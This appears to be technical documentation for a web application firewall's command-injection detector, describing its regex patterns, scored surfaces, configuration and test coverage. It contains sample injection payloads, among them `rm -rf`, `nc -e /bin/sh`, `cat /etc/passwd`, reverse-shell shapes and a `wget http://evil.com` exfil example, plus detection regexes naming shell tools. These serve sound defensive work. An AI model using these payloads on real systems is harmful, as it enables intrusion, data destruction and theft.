# Command Injection Detection

> **Status:** Implemented — `aegis-security/src/detectors/command_injection.rs`.
>
> **Landed:** 2026-05-08 (QA Run-4 SEC-M002 follow-up).
>
> See [`../../../plans/issue-fix/tester-n-2026-05-08-run4/PHASE-02-medium.md`](../../../plans/issue-fix/tester-n-2026-05-08-run4/PHASE-02-medium.md) for the design.

## Purpose

Detect attempts to execute shell commands by injecting OS-shell metacharacters into HTTP request values. Command injection is one of the highest-impact server-side vulnerabilities — successful exploitation typically yields arbitrary code execution under the WAF's upstream service. Common attack shapes:

- **Subshell expansion** — `?arg=$(id)`, `?x=\`whoami\``, `${PATH}`
- **Pipe-to-shell-cmd** — `?input=test|whoami`, `?q=foo|nc -e /bin/sh`
- **Command chaining** — `?cmd=ls;rm -rf /tmp`, `?cmd=ls&&whoami`
- **Direct shell invocation** — `?cmd=/bin/sh -c id`, `?cmd=bash -i`
- **Reverse-shell shapes** — `?cmd=nc -e`, `?cmd=mkfifo /tmp/p`

## Why this exists separately

Pre-2026-05-08 the rule pipeline had no dedicated cmdi class. `$()`, `|`, and backticks fell through every regex set. The AI detector caught most cmdi shapes empirically, but with AI disabled (the standard config post-Run-2 C002 follow-up) the rule-based pipeline missed them entirely. **QA Run-4 SEC-M002** flagged `?input=test|whoami` and `?arg=$(id)` as undetected.

This detector closes that gap with explicit shell-context patterns. **It does not depend on the AI detector** — it works in any rule-only pipeline.

## Detection strategy

The detector is **regex-only**, mirroring the sqli/xss/ssrf shape:

1. **Subshell forms** — `$(cmd)`, `\`cmd\``, `${VAR}`. Conservative: requires non-empty content / leading `[A-Za-z_]` to skip rare template-output shapes.
2. **Metacharacter + shell-builtin** — `|\s*whoami`, `;\s*nc`, `&&\s*rm`. The shell-builtin allowlist catches the OWASP cmdi sample set without firing on bare `|` (which appears in regex patterns) or bare `;` (legacy URL parameter separator).
3. **Direct shell paths** — `/bin/sh`, `/bin/bash`, `/bin/zsh`, etc.
4. **Reverse-shell shapes** — `bash -i`, `nc -e`, `mkfifo`.
5. **Exfil shape** — `cat /etc/passwd` (distinct from path_traversal's URL-path match — this catches the cmdi shape `;cat /etc/passwd`).

The patterns scan both the **raw URI string** and the **URL-decoded URI**, so `%24%28id%29` (the percent-encoded form of `$(id)`) matches the same as `$(id)`.

## Pattern categories

### Subshell

- `\$\([^)]+\)` — `$(cmd)`
- `\`[^\`]+\`` — backticks
- `\$\{[A-Za-z_][^}]+\}` — `${VAR}`

### Pipe-to-shell-cmd

`\|\s*(whoami|id|uname|cat|ls|nc\b|ncat|netcat|curl|wget|sh\b|bash|zsh|ksh|dash|cmd\.exe|powershell|python|perl|ruby|php|nslookup|ping|rm\b|mv\b|chmod|chown|nc\.exe)\b`

### Semicolon-shell-cmd

Same builtin allowlist as pipe, prefixed with `;\s*` instead of `\|\s*`.

### Logical chain operators

`(?:&&|\|\|)\s*<builtin>\b` — catches `ls&&whoami`, `ls||whoami`.

### Direct shell paths

`/bin/(sh|bash|zsh|ksh|dash)\b`

### Reverse-shell

- `bash\s+-i\b`
- `nc\s+-e\b`
- `mkfifo\s+`

### Exfil with shell context

`(?:^|;|\|\|?|&&|\`|\$\()\s*(?:wget|curl)\s+[a-z]+://` — catches `;wget http://evil.com` shapes; deliberately overlapping with SSRF on URL surface, but distinct on the cmdi-context prefix requirement.

## Surfaces inspected

For each request:

- **URI string** (path + query) — both raw and URL-decoded
- **Request body** — first 8 KiB, both raw and URL-decoded

The detector does **not** inspect:

- Headers — header injection has its own detector (`header_injection.rs`)
- Cookies — bypass-prone surface; callers can add via rule engine
- Body beyond 8 KiB — bounded to keep the detector cheap on the hot path

## Scoring

Single match → emit one `Signal { score: 50, tag: "command_injection", field: <"uri" | "body"> }`. Score `50` matches sqli/xss/ssrf weight: high-confidence shell-context patterns, not weak heuristics.

The detector early-exits on the first match within a given input string, so there's no quadratic cost on attack-shaped payloads.

## Configuration

The detector is class-toggleable via `cfg.detectors.command_injection.enabled` (default `true`):

```yaml
detectors:
  command_injection:
    enabled: true
```

It also surfaces in the v2.3 control plane as a **toggleable policy under `rules_engine`**:

```sh
# Disable command_injection at runtime (no restart):
curl -X POST http://127.0.0.1:8080/__waf_control/set_profile \
  -H "X-Benchmark-Secret: $SECRET" \
  -H 'content-type: application/json' \
  -d '{"scope":"policies","feature":"rules_engine","policies":["command_injection"],"mode":"log_only"}'
```

After the call, `command_injection`-flagged requests still emit `X-WAF-Action: block` + `X-WAF-Rule-Id: command_injection` but with `X-WAF-Mode: log_only` and the request reaches upstream — same `log_only` semantics as every other rules_engine policy.

## Actions on detection

- Add `50` to the request's risk score
- Emit an audit entry with `rule_id: "command_injection"` and `field: <"uri" | "body">`
- Mark the request for caching bypass (`X-WAF-Cache: BYPASS`)
- Depending on tier policy and final risk score, the request is allowed, challenged, or blocked (per the same path as sqli/xss/ssrf — see [`../security-engine.md`](../security-engine.md))

## False positive mitigation

The trigger list is intentionally **shell-context aware**, not bare-metacharacter:

| Input | Triggers? | Why |
|---|---|---|
| `?p=foo\|bar` | No | Bare pipe, no shell builtin after |
| `?p=foo\|whoami` | **Yes** | Pipe + whoami |
| `?a=1;b=2` | No | Legacy URL param separator |
| `?a=1;rm -rf /tmp` | **Yes** | Semicolon + shell command |
| `?expr=(a+b)` | No | Bare parens — no `$` prefix |
| `?x=$(id)` | **Yes** | Subshell |
| `?b=YWJjZA==` | No | Base64 — no shell context |
| `?v=${user.name}` | **Yes** (acknowledged) | Brace-subshell pattern matches; legit-looking template vars are rare in URL query strings — operators using template-style variables in URLs can disable this class via `/api/detectors` |

For deployment-specific tuning, the v2.3 `set_profile` runtime knob lets operators move `command_injection` into `log_only` without a restart while they collect live FP data.

## Implementation

- `crates/aegis-security/src/detectors/command_injection.rs` — pattern set, regex list, scorer (~200 lines, regex-only — no Hyperscan / Aho-Corasick dep)
- `crates/aegis-security/src/detectors/mod.rs` — registered in `default_detectors()` after `brute_force`
- `crates/aegis-security/src/detectors/mask.rs` — added as `DetectorClass::CommandInjection` (bit 8) + serde field on `DetectorMaskBody` (`#[serde(default)]` for backward-compat with old persistence snapshots)
- `crates/aegis-control/src/interop/rule_map.rs` — `"command_injection" | "cmdi" => ("rules_engine", "command_injection")` so v2.3 `set_profile` and `X-WAF-Mode` lookups work
- `crates/aegis-control/src/api/rules.rs` — added to `RESERVED_RULE_IDS` so operators can't shadow the class with a custom rule
- `crates/aegis-control/src/metrics/detector_hits.rs` — added to `class_label::ALL` so Prometheus pre-allocates the per-class counter

## Performance

- Regex-only — no Hyperscan / Aho-Corasick, so the detector is fully `safe` Rust with no FFI cost.
- All patterns are compiled once via `LazyLock`; per-request cost is `regex.is_match()` over the URI string + body, with early exit on first match.
- Body scan bounded at 8 KiB.
- Adds approximately one regex-set sweep to the detector pipeline — same shape as sqli/xss/ssrf, no new architectural cost.

## Tests

29 cases in `command_injection.rs::tests`:

- 3 QA Run-4 reproductions (`?input=test|whoami`, `?arg=$(id)`, pipe + nc)
- 7 subshell / brace / backtick / URL-encoded variants
- 4 chain operators (`;cmd`, `||cmd`, `&&cmd`, `;curl`)
- 4 direct shell invocation
- 2 exfil shapes
- 9 negative cases (clean queries, base64, bare pipes, legacy `;`, etc.)

Plus rule_map regression test in `aegis-control::interop::rule_map::tests::command_injection_maps_to_rules_engine`.

## See also

- [`../security-engine.md`](../security-engine.md) — pipeline overview
- [`../tiered-protection.md`](../tiered-protection.md) — per-tier mask resolution
- [`./README.md`](./README.md) — detector index
- [v2.3 contract §3](../../../Hackathon_Doc/EN_waf_interop_contract_v2.3.md) — detection surface requirements
